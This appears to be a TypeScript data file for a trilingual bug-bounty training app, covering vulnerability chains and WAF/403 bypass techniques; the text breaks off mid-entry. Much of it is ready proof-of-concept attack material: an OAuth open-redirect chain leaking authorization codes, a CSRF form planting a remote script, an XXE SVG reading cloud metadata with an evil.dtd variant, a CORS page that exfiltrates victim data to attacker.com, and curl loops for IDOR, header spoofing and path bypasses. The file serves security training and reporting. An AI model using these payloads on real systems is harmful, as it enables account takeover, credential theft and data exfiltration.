import type { Lang } from "./types";

export interface ChainStep {
  name: Record<Lang, string>;
  severity: string;
  desc: Record<Lang, string>;
}

export interface VulnChain {
  id: string;
  title: Record<Lang, string>;
  payoutBoost: string;
  formula: string;
  category: string;
  summary: Record<Lang, string>;
  steps: ChainStep[];
  pocTemplate: string;
  reportTitle: string;
  proTip: Record<Lang, string>;
  checklistCat: string;
}

export interface WafTechnique {
  title: Record<Lang, string>;
  category: "origin_ip" | "header_bypass" | "encoding" | "path_tampering";
  description: Record<Lang, string>;
  commandOrPayload: string;
  whyItWorks: Record<Lang, string>;
}

export interface ReconCommand {
  id: string;
  title: Record<Lang, string>;
  category: "subdomains" | "javascript" | "secrets" | "parameters" | "bypasses";
  toolsUsed: string[];
  command: string;
  explanation: Record<Lang, string>;
}

export interface MindsetRule {
  id: string;
  title: Record<Lang, string>;
  badge: Record<Lang, string>;
  subtitle: Record<Lang, string>;
  coreLesson: Record<Lang, string>;
  actionSteps: Record<Lang, string>[];
}

// ── 1. VULNERABILITY CHAINING MATRIX ──────────────────────────────────────────
export const VULN_CHAINS: VulnChain[] = [
  {
    id: "chain-ato-oauth",
    title: {
      en: "Open Redirect + OAuth Flow = 1-Click Full Account Takeover",
      simple: "Open Redirect + Social Login = Steal Any Account",
      hi: "ओपन रीडायरेक्ट + OAuth लॉगिन = 1-क्लिक फुल अकाउंट टेकओवर",
    },
    payoutBoost: "$0 / Informative ➔ $5,000 – $15,000 (P1 Critical)",
    formula: "Open Redirect (P4/P5) + OAuth redirect_uri Tampering ➔ Authorization Code Exfiltration (P1)",
    category: "Authentication Bypass",
    summary: {
      en: "An Open Redirect on its own is usually marked Informative or $0. But when chained with OAuth login, an attacker can steal the OAuth authorization code or access token by tricking the OAuth server into redirecting the token to an external attacker-controlled domain.",
      simple: "Alone, open redirect pays $0. But paired with Google/Apple login, you can steal the secret login code and log into any account.",
      hi: "साधारण ओपन रीडायरेक्ट पर $0 या Informative मिलता है। लेकिन जब इसे OAuth 'Sign in with Google' से जोड़ते हैं, तो विक्टिम का लॉगिन ऑथराइजेशन कोड सीधे अटैकर के सर्वर पर चला जाता है और अकाउंट टेकओवर हो जाता है।",
    },
    steps: [
      {
        name: { en: "1. Discover Open Redirect", simple: "1. Find Open Redirect", hi: "1. ओपन रीडायरेक्ट खोजें" },
        severity: "P4 ($0-$100)",
        desc: {
          en: "Find a parameter on target.com that redirects off-site: e.g. `https://target.com/logout?next=https://attacker.com` or `https://target.com/link?url=https://attacker.com`.",
          simple: "Find a link on the site that sends users to external websites.",
          hi: "टारगेट पर ऐसा पैरामीटर ढूंढें जो बाहर रीडायरेक्ट करता हो: `https://target.com/logout?next=https://attacker.com`।",
        },
      },
      {
        name: { en: "2. Inspect OAuth redirect_uri Whitelist", simple: "2. Check OAuth Whitelist", hi: "2. OAuth व्हाइटलिस्ट चेक करें" },
        severity: "Info",
        desc: {
          en: "The OAuth authorization server only allows redirects to `*.target.com/*`. It strictly rejects `redirect_uri=https://attacker.com` directly.",
          simple: "The website blocks direct attacker links in OAuth login.",
          hi: "OAuth सर्वर सिर्फ `target.com` के डोमेन को अनुमति देता है और सीधे अटैकर के डोमेन को ब्लॉक कर देता है।",
        },
      },
      {
        name: { en: "3. Chain via Nested Redirect", simple: "3. Combine Links", hi: "3. दोनों को एक साथ जोड़ें" },
        severity: "P1 Critical",
        desc: {
          en: "Set `redirect_uri=https://target.com/logout?next=https://attacker.com/steal`. The OAuth provider accepts `target.com`, authorizes the victim, and target.com immediately redirects the code to `attacker.com`!",
          simple: "Use the open redirect as the OAuth redirect link. The login code gets forwarded to you.",
          hi: "OAuth URL में `redirect_uri=https://target.com/logout?next=https://attacker.com/steal` डालें। सर्वर इसे target.com मानकर कोड अटैकर के सर्वर पर भेज देगा।",
        },
      },
    ],
    pocTemplate: `GET /oauth/v2/authorize?client_id=TARGET_CLIENT_ID&response_type=code&scope=openid%20profile%20email&redirect_uri=https%3A%2F%2Ftarget.com%2Flogout%3Fnext%3Dhttps%3A%2F%2Fattacker.com%2Flog HTTP/1.1
Host: target.com

# Attacker server logs:
# GET /log?code=AUTH_CODE_SECRET HTTP/1.1
# Attacker exchanges code for victim JWT access token.`,
    reportTitle: "[P1 Critical] 1-Click Full Account Takeover via Open Redirect Chained with OAuth 2.0 Authorization Flow",
    proTip: {
      en: "Always check if the OAuth endpoint supports `response_type=token` (implicit grant) as well as `code`. An access token in the URL fragment (`#access_token=...`) gets forwarded by modern browsers upon standard 302 redirects.",
      simple: "Always check if you can ask for a direct token instead of a code.",
      hi: "चेक करें कि क्या OAuth एंडपॉइंट `response_type=token` भी सपोर्ट करता है — इससे टोकन सीधे 302 रीडायरेक्ट में लीक हो जाता है।",
    },
    checklistCat: "web-oauth",
  },
  {
    id: "chain-selfxss-csrf",
    title: {
      en: "Self-XSS + CSRF on Profile = Stored XSS on Admin Panel",
      simple: "Self-XSS + CSRF = Hack Any User or Admin",
      hi: "सेल्फ-XSS + CSRF = एडमिन पैनल पर स्टोर्ड XSS",
    },
    payoutBoost: "0 Bounty / N/A ➔ $3,000 – $6,000 (P2/P1)",
    formula: "Self-XSS (0 Bounty) + Missing Anti-CSRF Token ➔ 1-Click Stored XSS (P1)",
    category: "Cross-Site Scripting (XSS)",
    summary: {
      en: "Self-XSS is universally closed as 'Not Applicable' because you can only execute JavaScript against yourself. But if the endpoint that updates your profile lacks CSRF protection or SameSite cookie restrictions, an attacker can force any victim (or customer support admin) to execute the payload with one click.",
      simple: "Self-XSS pays nothing. But if the profile form has no CSRF token, you can force someone else to save your attack script on their account.",
      hi: "सेल्फ-XSS को ट्राइएजर्स 0 रुपये देकर बंद कर देते हैं क्योंकि इसका असर सिर्फ आप पर होता है। लेकिन अगर प्रोफाइल अपडेट एंडपॉइंट पर CSRF टोकन न हो, तो विक्टिम सिर्फ 1 लिंक खोलकर अपने अकाउंट में XSS पेलोड इंजेक्ट करवा बैठता है।",
    },
    steps: [
      {
        name: { en: "1. Find Self-XSS in Profile Field", simple: "1. Find Self-XSS", hi: "1. प्रोफ़ाइल में सेल्फ-XSS खोजें" },
        severity: "N/A",
        desc: {
          en: "Inject `<img src=x onerror=alert(document.cookie)>` in First Name, Address, or Bio. It executes only in your browser.",
          simple: "Put XSS payload in your user profile name.",
          hi: "First Name या Address में `<img src=x onerror=alert(1)>` डालें — यह सिर्फ आपके ब्राउज़र में चलता है।",
        },
      },
      {
        name: { en: "2. Verify Missing CSRF Token", simple: "2. Check Missing CSRF", hi: "2. मिसिंग CSRF टोकन चेक करें" },
        severity: "P4",
        desc: {
          en: "Intercept the `POST /api/user/profile` update request. Remove the CSRF header or token. If server returns `200 OK`, CSRF is vulnerable.",
          simple: "Check if the server saves your profile without checking for secret tokens.",
          hi: "Burp में प्रोफाइल सेव रिक्वेस्ट से CSRF टोकन हटाएं। अगर 200 OK मिलता है, तो CSRF मुमकिन है।",
        },
      },
      {
        name: { en: "3. Weaponize via 1-Click HTML Form", simple: "3. Auto-Submit Form", hi: "3. 1-क्लिक ऑटो-सबमिट फॉर्म बनाएं" },
        severity: "P2 High",
        desc: {
          en: "Host an auto-submitting HTML form on attacker.com that posts the XSS payload into the victim's profile. When victim clicks, their account is permanently backdoored.",
          simple: "Send a link to the victim that automatically edits their profile to insert the attack script.",
          hi: "अटैकर वेबसाइट पर ऑटो-सबमिट फॉर्म लगाएं। विक्टिम के क्लिक करते ही उसके प्रोफाइल में पेलोड परमानेंट सेव हो जाता है।",
        },
      },
    ],
    pocTemplate: `<!DOCTYPE html>
<html>
  <body>
    <h3>Redirecting to Secure Verification...</h3>
    <form id="csrfForm" action="https://target.com/api/v1/user/profile" method="POST">
      <input type="hidden" name="first_name" value='&quot;&gt;&lt;script src=&quot;https://attacker.com/hook.js&quot;&gt;&lt;/script&gt;' />
      <input type="hidden" name="bio" value="Account Security Audit" />
    </form>
    <script>document.getElementById("csrfForm").submit();</script>
  </body>
</html>`,
    reportTitle: "[P2 High] Stored XSS via CSRF on /api/v1/user/profile Endpoint",
    proTip: {
      en: "Bonus escalation: If customer support agents view customer profiles in an internal Zendesk/admin portal, this becomes 'Blind Stored XSS on Support Staff' — an instant P1 Critical with administrative session hijack.",
      simple: "If customer support reads your profile, this infects the admin panel and becomes P1.",
      hi: "अगर कस्टमर सपोर्ट एजेंट एडमिन पैनल से प्रोफाइल देखता है, तो यह 'Blind XSS on Admin' बन जाता है — सीधा P1 Critical।",
    },
    checklistCat: "web-xss",
  },
  {
    id: "chain-uuid-idor",
    title: {
      en: "Public Review UUID Leak + Billing IDOR = P1 Financial Theft",
      simple: "Public ID Leak + IDOR = Steal Private Invoices",
      hi: "पब्लिक रिव्यू UUID लीक + बिलिंग IDOR = P1 वित्तीय डेटा चोरी",
    },
    payoutBoost: "P3 ($300) ➔ $4,000 – $8,000 (P1 Critical)",
    formula: "Information Disclosure (UUID Leak) + Unprotected Object Reference ➔ Multi-Tenant PII Exfiltration",
    category: "Broken Access Control",
    summary: {
      en: "When hunters report IDOR on endpoints using UUIDs (e.g. `/api/invoice/4a9c-8b1e...`), triagers often close it as 'Low impact' citing unguessable UUIDs. By finding a public endpoint that leaks victim UUIDs (like product reviews or public profiles), you complete the exploit chain.",
      simple: "Websites use long random IDs so you can't guess them. If you find a public page leaking those IDs, you can read everyone's private bills.",
      hi: "जब IDOR में लंबे रैंडम UUID होते हैं, तो ट्राइएजर्स कहते हैं कि 'UUID का अंदाज़ा नहीं लगाया जा सकता'। लेकिन जब आप किसी पब्लिक API (जैसे प्रोडक्ट रिव्यू) से पीड़ित का UUID निकाल लेते हैं, तो यह सीधे P1 क्रिटिकल बन जाता है।",
    },
    steps: [
      {
        name: { en: "1. Locate Read IDOR on Invoices", simple: "1. Find Billing IDOR", hi: "1. बिलिंग IDOR एंडपॉइंट खोजें" },
        severity: "P2/P3",
        desc: {
          en: "`GET /api/v2/invoices/{uuid}` returns invoice PDF, customer address, and card last4, but IDs are v4 UUIDs.",
          simple: "Invoice link gives private bills, but needs a random code.",
          hi: "इनवॉइस एंडपॉइंट पर किसी का भी बिल दिख सकता है, लेकिन उसके लिए v4 UUID चाहिए।",
        },
      },
      {
        name: { en: "2. Mine Public Endpoints for UUIDs", simple: "2. Find Public Leaks", hi: "2. पब्लिक एंडपॉइंट्स से UUID निकालें" },
        severity: "Info",
        desc: {
          en: "`GET /api/v1/products/42/reviews` returns comments along with full author metadata: `author_uuid: '4a9c-8b1e-...'`.",
          simple: "Check public reviews API to see author user codes in plain text.",
          hi: "पब्लिक रिव्यू API खोलें: वहाँ हर कमेंट के साथ यूज़र का ओरिजिनल `author_uuid` मौजूद होता है।",
        },
      },
      {
        name: { en: "3. Fetch Victim Invoice with Leaked UUID", simple: "3. Dump Data", hi: "3. लीक हुए UUID से बिल डाउनलोड करें" },
        severity: "P1 Critical",
        desc: {
          en: "Request `/api/v2/invoices/4a9c-8b1e-...` using Attacker token. Download victim's private corporate invoices.",
          simple: "Use the author code to download the invoice without permission.",
          hi: "अपने टोकन के साथ पीड़ित का UUID डालकर बिल डाउनलोड करें — 100% P1 कन्फर्म।",
        },
      },
    ],
    pocTemplate: `# Step 1: Extract victim UUID from public review
curl -s "https://target.com/api/v1/store/items/101/reviews" | jq '.[0].reviewer_account_id'
# Returns: "c7a421b8-3f59-42b1-91ea-02a8397a6120"

# Step 2: Exploit IDOR using Attacker Authorization Token
curl -s "https://target.com/api/v2/billing/invoices/c7a421b8-3f59-42b1-91ea-02a8397a6120/pdf" \\
  -H "Authorization: Bearer <ATTACKER_BEARER_TOKEN>" \\
  -o victim_invoice.pdf`,
    reportTitle: "[P1 Critical] BOLA/IDOR on /api/v2/billing/invoices Chained with Public Author UUID Exposure",
    proTip: {
      en: "Never dump 100 invoices. Provide reproduction steps with 1 victim account that you created and 1 attacker account. Mention: 'Chain demonstrates full unguessable UUID recovery'.",
      simple: "Test only on your own test accounts to avoid legal trouble.",
      hi: "सिर्फ अपने 2 अकाउंट्स पर टेस्ट करें और रिपोर्ट में लिखें: 'UUID unguessable नहीं है, पब्लिक API से निकाला जा सकता है'।",
    },
    checklistCat: "web-idor",
  },
  {
    id: "chain-svg-xxe-ssrf",
    title: {
      en: "SVG File Upload + XXE = Internal Cloud Metadata SSRF",
      simple: "SVG Picture Upload = Steal Cloud Master Keys",
      hi: "SVG इमेज अपलोड + XXE = इंटरनल क्लाउड मेटाडेटा SSRF",
    },
    payoutBoost: "P3 ($500) ➔ $5,000 – $15,000 (P1 Critical)",
    formula: "Unrestricted SVG Upload + Server-Side Image Conversion ➔ XML External Entity ➔ SSRF (P1)",
    category: "Server-Side Injection",
    summary: {
      en: "Many web applications allow users to upload profile pictures or organization logos as SVG files. Because SVG is based on XML, if the server renders or converts the SVG using an unhardened parser (like ImageMagick or Batik), an attacker can trigger XML External Entity (XXE) injection to read local files or query internal AWS/GCP cloud metadata.",
      simple: "SVG image files are written in code. If the website converts your SVG image, you can tell it to steal cloud passwords.",
      hi: "वेबसाइट पर जब SVG अवतार अपलोड होता है, तो बैकएंड सर्वर उसे प्रोसेस करता है। SVG असल में XML कोड होता है। अगर बैकएंड में XML parser सुरक्षित न हो, तो सर्वर से सीधे AWS/GCP मेटाडेटा (`169.254.169.254`) एक्सेस करके क्लाउड कीज़ निकाली जा सकती हैं।",
    },
    steps: [
      {
        name: { en: "1. Identify SVG Avatar/Logo Upload", simple: "1. Find SVG Upload", hi: "1. SVG इमेज अपलोड ढूंढें" },
        severity: "Info",
        desc: {
          en: "Look for profile photo, company brand logo, or invoice watermark upload fields that accept `.svg`.",
          simple: "Find upload forms that allow .svg files.",
          hi: "प्रोफाइल फोटो या लोगो अपलोड फील्ड ढूंढें जो `.svg` फाइल्स स्वीकार करती हो।",
        },
      },
      {
        name: { en: "2. Craft Malicious SVG with XXE", simple: "2. Make XXE Image", hi: "2. XXE पेलोड वाली SVG फाइल बनाएं" },
        severity: "P2 High",
        desc: {
          en: "Embed an external XML entity pointing to your interactsh Collaborator domain or internal metadata address.",
          simple: "Put secret server fetch code inside the SVG file.",
          hi: "SVG के अंदर XML entity डालें जो `169.254.169.254` या interactsh डोमेन को कॉल करे।",
        },
      },
      {
        name: { en: "3. Read Server Response or Out-of-Band Call", simple: "3. Read Credentials", hi: "3. रिस्पॉन्स में क्लाउड कीज़ देखें" },
        severity: "P1 Critical",
        desc: {
          en: "If the server converts SVG to PNG, the rendered image shows the text of `/etc/passwd` or cloud IAM security credentials.",
          simple: "The converted picture literally displays the secret password text.",
          hi: "जब सर्वर SVG को PNG में कन्वर्ट करता है, तो इमेज के अंदर `/etc/passwd` या AWS IAM क्रेडेंशियल्स प्रिंट हो जाते हैं।",
        },
      },
    ],
    pocTemplate: `<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<svg width="500px" height="150px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="10" y="40">&xxe;</text>
</svg>`,
    reportTitle: "[P1 Critical] Server-Side XML External Entity (XXE) to Cloud Metadata SSRF via SVG Avatar Upload",
    proTip: {
      en: "If direct HTTP metadata is blocked, test Out-of-Band (OOB) XXE using an external DTD: `<!ENTITY % dtd SYSTEM 'http://attacker.com/evil.dtd'> %dtd;`. This sends the credentials directly to your server.",
      simple: "If metadata is blocked, send the secret data silently to your external server.",
      hi: "अगर डायरेक्ट मेटाडेटा ब्लॉक हो, तो OOB XXE (`evil.dtd`) यूज़ करें जिससे डेटा सीधे आपके interactsh सर्वर पर आ जाए।",
    },
    checklistCat: "web-xxe",
  },
  {
    id: "chain-cors-api",
    title: {
      en: "Reflected CORS Origin + Credentialed API = Session Data Theft",
      simple: "Misconfigured CORS = Steal Private Account Data",
      hi: "रिफ्लेक्टेड CORS ओरिजिन + क्रेडेंशियल API = सेशन डेटा चोरी",
    },
    payoutBoost: "P4 / Informative ➔ $2,000 – $5,000 (P2/P1)",
    formula: "Origin Header Reflection + Access-Control-Allow-Credentials: true ➔ 1-Click Cross-Domain Data Exfiltration",
    category: "Security Misconfiguration",
    summary: {
      en: "Triagers reject generic CORS reports if you only test on static assets. But when an authenticated JSON endpoint reflecting `Origin: https://attacker.com` contains private email, billing tokens, or addresses with `Access-Control-Allow-Credentials: true`, an attacker can read the victim's data from an external browser tab.",
      simple: "CORS on public pages pays nothing. But CORS on /api/user lets an evil website read the victim's private email and tokens.",
      hi: "साधारण पेज पर CORS रिपोर्ट रिजेक्ट हो जाती है। लेकिन अगर `/api/me` या `/api/profile` पर `Origin: https://attacker.com` रिफ्लेक्ट हो रहा हो और `Allow-Credentials: true` हो, तो अटैकर अपनी वेबसाइट से विक्टिम का सारा प्राइवेट डेटा चुरा सकता है।",
    },
    steps: [
      {
        name: { en: "1. Test Origin Reflection", simple: "1. Send Origin Header", hi: "1. Origin हेडर भेजकर टेस्ट करें" },
        severity: "P4",
        desc: {
          en: "Send request with `Origin: https://evil.com`. Check if response reflects `Access-Control-Allow-Origin: https://evil.com`.",
          simple: "Send a fake site name and see if the server trusts it.",
          hi: "रिक्वेस्ट में `Origin: https://evil.com` भेजें और चेक करें कि क्या सर्वर इसे रिफ्लेक्ट करता है।",
        },
      },
      {
        name: { en: "2. Verify Allow-Credentials Header", simple: "2. Check Credentials Flag", hi: "2. Allow-Credentials फ्लैग चेक करें" },
        severity: "P3",
        desc: {
          en: "Crucial condition: `Access-Control-Allow-Credentials: true` must be present. Without this, cookies and authorization tokens cannot be read by JavaScript.",
          simple: "Make sure Allow-Credentials is set to true.",
          hi: "सबसे ज़रूरी: रिस्पॉन्स में `Access-Control-Allow-Credentials: true` होना चाहिए।",
        },
      },
      {
        name: { en: "3. Build 1-Click Stealer PoC", simple: "3. Build PoC HTML", hi: "3. 1-क्लिक स्टीलर PoC बनाएं" },
        severity: "P2 High",
        desc: {
          en: "Host a webpage that executes `fetch('https://target.com/api/me', {credentials: 'include'})` and sends the JSON response to attacker's logger.",
          simple: "Host an HTML page that reads the victim's profile and sends it to you.",
          hi: "HTML पेज बनाएं जो `fetch(..., {credentials: 'include'})` चलाकर विक्टिम का डेटा अटैकर सर्वर पर भेज दे।",
        },
      },
    ],
    pocTemplate: `<!DOCTYPE html>
<html>
  <body>
    <h2>Security Verification in Progress...</h2>
    <script>
      fetch("https://target.com/api/v1/user/settings", {
        method: "GET",
        credentials: "include"
      })
      .then(response => response.json())
      .then(data => {
        // Exfiltrate victim sensitive profile & tokens to attacker
        fetch("https://attacker.com/exfil?data=" + encodeURIComponent(JSON.stringify(data)));
      });
    </script>
  </body>
</html>`,
    reportTitle: "[P2 High] Sensitive PII Exfiltration via Insecure CORS Configuration on /api/v1/user/settings",
    proTip: {
      en: "Test with `Origin: null`. Many sandboxed iframes send `null` origin, and developers mistakenly whitelist `Access-Control-Allow-Origin: null`, which is exploitable via `<iframe sandbox='allow-scripts'>`.",
      simple: "Try Origin: null. Many servers mistakenly trust it.",
      hi: "`Origin: null` टेस्ट करें। कई डेवलपर्स `null` को सुरक्षित मानकर अलाउ कर देते हैं, जिसे iframe सैंडबॉक्स से बाईपास किया जा सकता है।",
    },
    checklistCat: "web-cors",
  },
];

// ── 2. WAF & 403 BYPASS TECHNIQUES ───────────────────────────────────────────
export const WAF_BYPASS_DATA: WafTechnique[] = [
  {
    title: {
      en: "Origin IP Discovery (Bypassing Cloudflare/Akamai Completely)",
      simple: "Finding the Secret Real Server IP",
      hi: "ओरिजिनल बैकएंड IP खोजना (WAF को 100% बाईपास करना)",
    },
    category: "origin_ip",
    description: {
      en: "Cloudflare and AWS WAF only protect traffic that passes through their edge proxy. If you locate the backend web server's real IP address, you can send HTTP requests directly to it, completely evading all WAF inspection and rate limits.",
      simple: "WAF only protects the front door. If you find the real server IP address, you can bypass the firewall completely.",
      hi: "Cloudflare या Akamai सिर्फ प्रॉक्सी पर काम करते हैं। अगर आप टारगेट का असली बैकएंड IP ढूंढ लें, तो बिना किसी WAF या रेट लिमिट के सीधे सर्वर पर अटैक किया जा सकता है।",
    },
    commandOrPayload: `# 1. Censys / Shodan search by SSL Certificate
censys search "services.tls.certificates.leaf_data.subject.common_name: target.com"
shodan search "ssl.cert.subject.cn:target.com http.title:'Company Portal'"

# 2. Check Historical DNS Records before Cloudflare was enabled
curl -s "https://api.securitytrails.com/v1/history/target.com/dns/a" -H "APIKEY: <KEY>"

# 3. Test Direct Host Header hit once IP is found:
curl -k -H "Host: target.com" "https://198.51.100.42/api/v1/admin"`,
    whyItWorks: {
      en: "Companies often configure DNS to point to Cloudflare, but forget to configure their firewall (AWS Security Group or iptables) to drop traffic coming from non-Cloudflare IP ranges.",
      simple: "Companies forget to lock the backend server to only accept Cloudflare connections.",
      hi: "कंपनियां डोमेन को Cloudflare पर पॉइंट कर देती हैं, लेकिन बैकएंड सर्वर पर यह नियम लगाना भूल जाती हैं कि सिर्फ Cloudflare के IPs ही कनेक्ट हो सकें।",
    },
  },
  {
    title: {
      en: "403 Forbidden Header Tampering & Proxy Spoofing",
      simple: "Fake Headers to Bypass 403 Forbidden",
      hi: "403 Forbidden हेडर स्पूफिंग बाईपास",
    },
    category: "header_bypass",
    description: {
      en: "Reverse proxies and NGINX servers frequently restrict access to `/admin` based on client IP. By sending trusted internal localhost headers, you can trick the backend server into believing the request originated from the internal loopback adapter.",
      simple: "Add headers that tell the server 'I am an internal admin computer' to unlock 403 pages.",
      hi: "रिवर्स प्रॉक्सी कई बार `/admin` को बाहरी यूज़र्स के लिए 403 ब्लॉक कर देती हैं। लोकलहोस्ट हेडर्स भेजकर सर्वर को यह विश्वास दिलाया जा सकता है कि रिक्वेस्ट इंटरनल नेटवर्क से आई है।",
    },
    commandOrPayload: `# Headers that trick reverse proxies and NGINX:
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1

# Rapid test loop in Bash:
for h in "X-Forwarded-For: 127.0.0.1" "X-Original-URL: /admin" "X-Custom-IP-Authorization: 127.0.0.1"; do
  curl -s -k -H "$h" "https://target.com/admin" -o /dev/null -w "%{http_code} -> $h\\n"
done`,
    whyItWorks: {
      en: "NGINX or Apache frontends pass client headers straight through to upstream microservices without stripping duplicate or untrusted X-Forwarded headers.",
      simple: "Backend services blindly trust headers passed by the front proxy.",
      hi: "NGINX बैकएंड माइक्रोसर्विसेज को हेडर्स बिना साफ़ किए फॉरवर्ड कर देता है, जिससे बैकएंड समझता है कि रिक्वेस्ट 127.0.0.1 से आई है।",
    },
  },
  {
    title: {
      en: "Path Normalization & URL Syntax Bypasses",
      simple: "URL Slashes and Dots to Slip Past 403",
      hi: "URL पाथ नॉर्मलाइजेशन और स्लैश बाईपास ट्रिक्स",
    },
    category: "path_tampering",
    description: {
      en: "WAF rules match paths literally using string filters (e.g. `path == '/admin'`). By introducing path traversal dots, semicolons, or URL encoding, the WAF sees a non-matching string, while the backend web server resolves it to `/admin`.",
      simple: "Change /admin to /%2e/admin to confuse the firewall while the website still loads the admin page.",
      hi: "WAF नियम स्ट्रिंग मैच करते हैं (जैसे `/admin`). जब हम डमी डॉट्स या सेमीकोलन लगाते हैं, तो WAF स्ट्रिंग को पहचान नहीं पाता लेकिन बैकएंड सर्वर उसे `/admin` पर ही खोलता है।",
    },
    commandOrPayload: `# Path normalization permutations to test on any 403 endpoint:
https://target.com/%2e/admin
https://target.com/admin/..;/
https://target.com/admin;
https://target.com/admin.json
https://target.com//admin//
https://target.com/admin/
https://target.com/api/v1/..;/admin
https://target.com/admin?anything`,
    whyItWorks: {
      en: "Different frameworks (Spring Boot, Tomcat, Nginx) parse URI paths differently. Tomcat treats `;` as matrix parameter delimiter, while Nginx treats it as literal path character.",
      simple: "Different web servers read slashes and dots differently, creating a loophole.",
      hi: "Tomcat और NGINX में URL पार्सिंग का तरीका अलग होता है — Tomcat `;` को पैरामीटर मानता है, जिससे WAF बाईपास हो जाता है।",
    },
  },
  {
    title: {
      en: "Content-Type Swapping & Unicode Escaping",
      simple: "Changing Format to Sneak Past Payload Filters",
      hi: "कंटेंट-टाइप बदलना और यूनिकोड एन्कोडिंग बाईपास",
    },
    category: "encoding",
    description: {
      en: "Many WAFs only inspect traditional form bodies (`application/x-www-form-urlencoded`). By converting the POST request to `multipart/form-data` or `application/json` with Unicode escaping, the WAF fails to parse the attack strings.",
      simple: "Convert your form to JSON or Unicode codes so the security scanner cannot read your attack words.",
      hi: "ज़्यादातर WAF सिर्फ साधारण फॉर्म डेटा स्कैन करते हैं। जब आप रिक्वेस्ट को `application/json` या `multipart/form-data` में बदलते हैं और यूनिकोड (`\\u0027`) यूज़ करते हैं, तो WAF पेलोड को पढ़ नहीं पाता।",
    },
    commandOrPayload: `# 1. JSON Unicode Escaping in Burp Repeater:
# Instead of: {"query": "test' OR 1=1--"}
# Send:
{"query": "test\\u0027\\u0020\\u004f\\u0052\\u0020\\u0031\\u003d\\u0031"}

# 2. Content-Type Swapping:
# Change: Content-Type: application/x-www-form-urlencoded
# To: Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXYZ

# 3. Double URL Encoding in query params:
# %252e%252e%252f (resolves to ../ after 2 server passes)`,
    whyItWorks: {
      en: "Web Application Firewalls run fast regex string matching on raw request bodies. JSON parsers on the backend decode `\\u0027` into `'` after the WAF has already approved the packet.",
      simple: "The firewall scans the raw text before the server decodes the secret unicode letters.",
      hi: "WAF सिर्फ रॉ टेक्स्ट पर रेगेक्स चलाता है। बैकएंड सर्वर WAF पास होने के बाद यूनिकोड को ओरिजिनल कैरेक्टर में डिकोड करता है।",
    },
  },
  {
    title: {
      en: "HTTP Verb & Method Tampering Bypasses (HEAD, TRACE & Overrides)",
      simple: "Change HTTP Method to Bypass 403",
      hi: "HTTP मेथड व वर्ब टैम्परिंग (HEAD, TRACE व मेथड ओवरराइड)",
    },
    category: "path_tampering",
    description: {
      en: "Firewall Access Control Lists (ACLs) are frequently written as `<Limit GET>` in web server configurations. By switching the HTTP verb to `HEAD`, `POST`, or using method override headers, the restriction rule is completely bypassed while the server executes the route.",
      simple: "Security filters only block GET requests. Changing the method to HEAD or POST can sneak past the block.",
      hi: "सर्वर के सुरक्षा नियम अक्सर सिर्फ `GET` रिक्वेस्ट पर लगे होते हैं। जब आप मेथड को `HEAD`, `POST` या `X-HTTP-Method-Override` में बदलते हैं, तो नियम बाईपास हो जाता है।",
    },
    commandOrPayload: `# 1. Test HEAD method (often leaks Content-Length or full response headers):
curl -i -X HEAD "https://target.com/admin"

# 2. Test HTTP Method Overriding Headers:
curl -s -X POST "https://target.com/admin" -H "X-HTTP-Method-Override: GET"
curl -s -X POST "https://target.com/admin" -H "X-Method-Override: GET"
curl -s -X POST "https://target.com/admin" -H "X-HTTP-Method: GET"

# 3. Test arbitrary or uncommon HTTP verbs:
curl -i -X TRACE "https://target.com/admin"
curl -i -X OPTIONS "https://target.com/admin"
curl -i -X JEFF "https://target.com/admin"`,
    whyItWorks: {
      en: "Apache and IIS `<Directory>` blocks often only restrict `GET` and `POST`. Frameworks like Ruby on Rails, Laravel, and Spring look at `X-HTTP-Method-Override` to resolve the internal controller route.",
      simple: "Firewall rules only check the outer POST word, but web frameworks read the inner header to run the admin code.",
      hi: "फायरवॉल सिर्फ बाहर के मेथड को देखता है, जबकि वेब फ्रेमवर्क अंदर के `X-HTTP-Method-Override` हेडर को पढ़कर एडमिन कोड रन कर देता है।",
    },
  },
  {
    title: {
      en: "Spring Boot & Java Semicolon Matrix Traversal (/admin;, /admin/..;/)",
      simple: "Java Semicolon Tricks for 403 Pages",
      hi: "Spring Boot और Java सेमीकोलन मैट्रिक्स पाथ बाईपास",
    },
    category: "path_tampering",
    description: {
      en: "Java Servlets and Spring MVC support matrix parameters separated by semicolons (`;`). When an NGINX reverse proxy forwards traffic to Tomcat/Spring, NGINX evaluates `/admin;` as a distinct string (allowing it), but Spring strips the `;` and routes it directly to `@RequestMapping(\"/admin\")`.",
      simple: "Adding a semicolon (;) fools the front proxy while the Java backend still opens the secret page.",
      hi: "Java और Spring MVC में सेमीकोलन (`;`) मैट्रिक्स पैरामीटर माना जाता है। NGINX इसे अलग पाथ समझकर पास कर देता है, और Spring बैकएंड इसे सीधे `/admin` पर खोल देता है।",
    },
    commandOrPayload: `# Spring Boot and Java Servlet bypass permutations:
curl -i "https://target.com/admin;"
curl -i "https://target.com/admin;foo=bar"
curl -i "https://target.com/admin/..;/"
curl -i "https://target.com/api/v1/users/..;/admin"
curl -i "https://target.com/error/..;/admin"
curl -i "https://target.com/public/..;/admin"`,
    whyItWorks: {
      en: "Discrepancy in RFC 3986 path parsing: NGINX proxies treat `;` as a valid path character, while Tomcat and Spring MVC interpret it as matrix variable delimiters, normalizing `/admin;` down to `/admin`.",
      simple: "NGINX sees /admin; as an allowed safe link, but Java strips the semicolon to access the admin portal.",
      hi: "NGINX सेमीकोलन को नॉर्मल कैरेक्टर मानकर ब्लॉक नहीं करता, लेकिन Java बैकएंड सेमीकोलन को हटाकर एडमिन पोर्टल लोड कर देता है।",
    },
  },
  {
    title: {
      en: "Extension Appending & Content Negotiation Bypasses (.json, Accept Header)",
      simple: "Add .json or .html to 403 Links",
      hi: "एक्सटेंशन जोड़ना (.json) और Accept हेडर बाईपास",
    },
    category: "path_tampering",
    description: {
      en: "Access controls often restrict the raw endpoint `/admin`, but fail to guard extension-suffixed routes or API formats. Appending `.json`, `.html`, or tampering the `Accept` header triggers alternative controller serializers that bypass auth middleware.",
      simple: "Append .json to the end of a forbidden link to get raw data directly from the server.",
